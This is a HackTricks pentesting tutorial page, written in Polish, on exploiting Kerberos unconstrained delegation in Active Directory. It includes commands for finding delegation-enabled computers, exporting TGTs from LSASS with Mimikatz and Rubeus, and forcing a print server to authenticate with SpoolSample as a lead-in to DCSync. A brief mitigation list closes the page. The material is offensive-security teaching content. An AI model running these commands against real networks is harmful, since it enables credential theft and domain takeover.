# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

To jest funkcja, którą Administrator Domeny może ustawić dla dowolnego **Komputera** w domenie. Następnie, za każdym razem, gdy **użytkownik loguje się** na Komputerze, **kopie TGT** tego użytkownika będą **wysyłane w TGS** dostarczanym przez DC **i zapisywane w pamięci w LSASS**. Więc, jeśli masz uprawnienia Administratora na maszynie, będziesz mógł **zrzucić bilety i podszyć się pod użytkowników** na dowolnej maszynie.

Jeśli więc administrator domeny loguje się na Komputerze z aktywowaną funkcją "Unconstrained Delegation", a ty masz lokalne uprawnienia administratora na tej maszynie, będziesz mógł zrzucić bilet i podszyć się pod Administratora Domeny wszędzie (privesc domeny).

Możesz **znaleźć obiekty Komputerów z tym atrybutem** sprawdzając, czy atrybut [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) zawiera [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Możesz to zrobić za pomocą filtru LDAP ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, co robi powerview:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

Załaduj bilet Administratora (lub użytkownika ofiary) w pamięci za pomocą **Mimikatz** lub **Rubeus dla** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Więcej informacji: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Więcej informacji o Unconstrained delegation w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

Jeśli atakujący jest w stanie **skompromitować komputer dozwolony dla "Unconstrained Delegation"**, mógłby **oszukać** **serwer drukarki**, aby **automatycznie się zalogował** do niego **zapisując TGT** w pamięci serwera.\
Następnie atakujący mógłby przeprowadzić **atak Pass the Ticket, aby podszyć się** pod konto komputera serwera drukarki.

Aby sprawić, by serwer drukarki zalogował się na dowolnej maszynie, możesz użyć [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Jeśli TGT pochodzi z kontrolera domeny, możesz przeprowadzić atak [**DCSync**](acl-persistence-abuse/index.html#dcsync) i uzyskać wszystkie hashe z DC.\
[**Więcej informacji na temat tego ataku na ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Oto inne sposoby na wymuszenie uwierzytelnienia:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigacja

- Ogranicz logowania DA/Admin do określonych usług
- Ustaw "Konto jest wrażliwe i nie może być delegowane" dla uprzywilejowanych kont.

{{#include ../../banners/hacktricks-training.md}}
